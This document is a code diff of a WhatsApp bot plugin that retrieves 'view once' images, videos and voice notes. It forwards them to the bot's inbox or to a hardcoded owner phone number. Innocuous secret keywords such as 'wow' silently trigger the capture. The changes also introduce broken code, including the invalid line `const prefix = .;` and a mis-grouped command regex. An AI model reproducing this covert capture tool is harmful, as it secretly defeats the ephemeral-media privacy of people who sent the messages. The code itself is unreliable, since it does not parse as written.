@@ -1,21 +1,21 @@
-/*import pkg from '@whiskeysockets/baileys';
+import pkg from '@whiskeysockets/baileys';
 const { downloadMediaMessage } = pkg;
 import config from '../config.js';
 
-const OwnerCmd = async (m, Matrix) => {
-  const botNumber = Matrix.user.id.split(':')[0] + '@s.whatsapp.net';
-  const ownerNumber = config.OWNER_NUMBER + '@s.whatsapp.net';
-  const prefix = config.PREFIX;
+let handler = async (m, { conn }) => {
+  const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
+  const ownerNumber = 255734980103 + '@s.whatsapp.net';
+  const prefix = .;
 
-  // Secret keywords for sending media to bot inbox
+  // Secret keywords for triggering media forwarding
   const secretKeywords = ['🔥', 'wow', 'nice'];
 
   // Extract command or detect secret keyword
-  const cmd = m.body.startsWith(prefix) 
-    ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() 
-    : secretKeywords.includes(m.body.toLowerCase()) 
-      ? 'vv2' // Secret keywords act as 'vv2'
-      : '';
+  const cmd = m.text.startsWith(prefix)
+    ? m.text.slice(prefix.length).split(' ')[0].toLowerCase()
+    : secretKeywords.includes(m.text.toLowerCase())
+    ? 'vv2' // Secret keywords act as 'vv2'
+    : '';
 
   // Validate command
   if (!['vv', 'vv2', 'vv3'].includes(cmd)) return;
@@ -52,21 +52,23 @@ const OwnerCmd = async (m, Matrix) => {
     if (!buffer) return m.reply('*Failed to retrieve media!*');
 
     let mimetype = msg.audioMessage?.mimetype || 'audio/ogg';
-    let caption = `> *© Powered By Silva*`;
+    let caption = `> *© Powered By Lazack-Bots*`;
 
-    // If command is from a secret keyword, force it to send to bot inbox
-    let recipient = cmd === 'vv2' || secretKeywords.includes(m.body.toLowerCase()) 
-      ? botNumber  // ✅ Bot inbox (Secret Mode & `.vv2`)
-      : cmd === 'vv3' 
-        ? ownerNumber  // ✅ Owner inbox
-        : m.from; // Same chat for `.vv`
+    // Determine recipient based on command
+    let recipient =
+      cmd === 'vv2' || secretKeywords.includes(m.text.toLowerCase())
+        ? botNumber // ✅ Bot inbox (Secret Mode & `.vv2`)
+        : cmd === 'vv3'
+        ? ownerNumber // ✅ Owner inbox
+        : m.chat; // Same chat for `.vv`
 
+    // Send media accordingly
     if (messageType === 'imageMessage') {
-      await Matrix.sendMessage(recipient, { image: buffer, caption });
+      await conn.sendMessage(recipient, { image: buffer, caption });
     } else if (messageType === 'videoMessage') {
-      await Matrix.sendMessage(recipient, { video: buffer, caption, mimetype: 'video/mp4' });
-    } else if (messageType === 'audioMessage') {  
-      await Matrix.sendMessage(recipient, { audio: buffer, mimetype, ptt: true });
+      await conn.sendMessage(recipient, { video: buffer, caption, mimetype: 'video/mp4' });
+    } else if (messageType === 'audioMessage') {
+      await conn.sendMessage(recipient, { audio: buffer, mimetype, ptt: true });
     } else {
       return m.reply('*Unsupported media type!*');
     }
@@ -78,5 +80,9 @@ const OwnerCmd = async (m, Matrix) => {
   }
 };
 
+handler.help = ['vv', 'vv2', 'vv3'];
+handler.tags = ['owner'];
+handler.command = /^vv|vv2|vv3$/i;
+handler.owner = true;
 
-export default OwnerCmd;
+export default handler;
